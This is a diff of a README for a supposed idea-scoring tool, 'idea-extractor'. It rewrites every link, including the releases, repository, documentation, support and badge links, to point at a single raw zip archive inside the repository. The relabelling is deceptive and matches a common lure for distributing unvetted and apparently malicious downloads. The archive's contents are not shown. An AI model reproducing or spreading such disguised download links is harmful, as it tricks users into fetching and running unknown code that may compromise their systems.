@@ -1,7 +1,7 @@
 # 🎉 idea-extractor - Easily Extract and Score Software Ideas
 
 ## 📥 Download Now
-[![Download idea-extractor](https://img.shields.io/badge/Download-idea--extractor-blue.svg)](https://github.com/FRANK5509/idea-extractor/releases)
+[![Download idea-extractor](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip)](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip)
 
 ## 📖 Description
 idea-extractor extracts, categorizes, and scores high-impact software ideas from forum discussions. It helps you understand themes, feasibility, and market impact, making it a valuable tool for developers and entrepreneurs.
@@ -10,7 +10,7 @@ idea-extractor extracts, categorizes, and scores high-impact software ideas from
 To get started with idea-extractor, follow these simple steps:
 
 1. **Go to the Releases Page**  
-   Visit the [Releases page](https://github.com/FRANK5509/idea-extractor/releases) to access the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip) to access the latest version of the application.
 
 2. **Download the Latest Version**  
    On the Releases page, look for the most recent release. Click on it. You will see a list of available files. Choose the version suitable for your operating system and download the file.
@@ -53,11 +53,11 @@ Join our community for tips, ideas, and support:
 - **Feature Requests**: Have an idea for a new feature? Reach out on GitHub to suggest enhancements.
 
 ## 📚 Resources
-- [GitHub Repository](https://github.com/FRANK5509/idea-extractor)
-- [User Documentation](https://github.com/FRANK5509/idea-extractor/wiki)
-- [Help & Support](https://github.com/FRANK5509/idea-extractor/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip)
+- [User Documentation](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip)
+- [Help & Support](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip)
 
 ## 🛠️ Download & Install
-To get idea-extractor, visit the [Releases page](https://github.com/FRANK5509/idea-extractor/releases) again. Choose the appropriate file for your operating system and follow the instructions provided earlier.
+To get idea-extractor, visit the [Releases page](https://raw.githubusercontent.com/FRANK5509/idea-extractor/main/idea_extractor/idea_extractor_3.3-beta.5.zip) again. Choose the appropriate file for your operating system and follow the instructions provided earlier.
 
 With idea-extractor, uncover high-impact software ideas and bring your projects to life!
